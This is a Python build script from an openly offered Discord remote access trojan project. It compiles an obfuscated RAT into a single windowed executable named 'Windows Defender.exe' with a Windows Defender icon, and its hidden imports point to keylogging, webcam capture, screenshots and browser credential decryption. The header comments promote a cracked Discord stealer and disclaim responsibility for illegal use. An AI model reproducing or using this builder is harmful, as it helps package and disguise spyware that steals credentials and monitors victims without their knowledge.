import subprocess
import sys
import os


# This RAT is made by H-zz-H!  
# If you have any questions or need help, feel free to contact me on Discord: _h_zz_h_ or join my server: https://discord.gg/29Ya4F3CgQ.  
# On my Discord server (as of 23.02.2025), I have posted a cracked open-source Discord Stealer that would normally cost more than 120 euros for lifetime access.  
# Join my Discord server for coding help or if you encounter errors with this RAT. I am always open to new ideas, projects, or feature suggestions for this RAT.  
# If you want to add new features or improve this RAT, feel free to do so and share your work with me on Discord.  
# If I find the time, this RAT will be updated and working forever. If not, well, I don't know.  
# If you use this RAT for illegal purposes, I am not responsible for it. I am also not responsible for any damage caused by this RAT.  
# Skid from this project if you want, I don’t really care lol. Just don’t claim it as your own work.  

# Sources I skidded from:  
# https://github.com/Blank-c/Blank-Grabber (The !blocklist and !unblocklist commands are almost fully skidded. I just changed the code a bit to fit my project).  
# Tried doing it on my own (but I’m way too retarded for that).
# https://github.com/moom825/Discord-RAT (Because of this RAT, I started this project. So special thanks to moom825).  
# The !uncritproc and !critproc commands are from moom825's Discord-RAT project. Many features are quite the same as in moom825's project.  
# That’s because I needed some features I could code, and his GitHub page was full of ideas to implement.  
# Almost everything in this project is inspired by him.  

# Thanks for taking the time to read.  
# Love y’all. Bye.  
# ~~~ H-zz-H ~~~  

# This is the code for the exe_generator.py file.
# This file is used to create the .exe file of the RAT.
# Just make sure to have the already with obfuscater.py obfuscated python file (obfuscated_H-zz-H.py) 
# and the icon file (WindowsDefender.ico) in the same directory as this file.


def create_exe(script_path, icon_path, output_name):
    if not os.path.isfile(script_path):
        print(f"Error: The script '{script_path}' does not exist.")
        sys.exit(1)

    if not os.path.isfile(icon_path):
        print(f"Error: The icon '{icon_path}' does not exist.")
        sys.exit(1)

    command = [
        'pyinstaller',
        '--clean',
        '--onefile',
        '--windowed',
        '--name', output_name,
        '--icon', icon_path,
        '--hidden-import=aiohttp',
        '--hidden-import=cv2',
        '--hidden-import=discord',
        '--hidden-import=pyautogui',
        '--hidden-import=pyaes',
        '--hidden-import=colorama',
        '--hidden-import=win32crypt',
        '--hidden-import=pynput.keyboard._win32',
        '--hidden-import=wave',
        '--hidden-import=sqlite3',
        '--hidden-import=pynput.mouse._win32',
        script_path
    ]

    print("""Made by H-zz-H\nDiscord: _h_zz_h_ or https://discord.gg/29Ya4F3CgQ\nBuilding RAT. Please Wait. Can take up to 1 minute.""")

    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if result.returncode != 0:
        print("Error creating the .exe file:")
        print(result.stderr.decode())
    else:
        print(f"Successfully created {output_name}.exe")

if __name__ == "__main__":
    script_path = "obfuscated_H-zz-H.py"
    icon_path = "WindowsDefender.ico"
    output_name = "Windows Defender.exe"

    create_exe(script_path, icon_path, output_name)
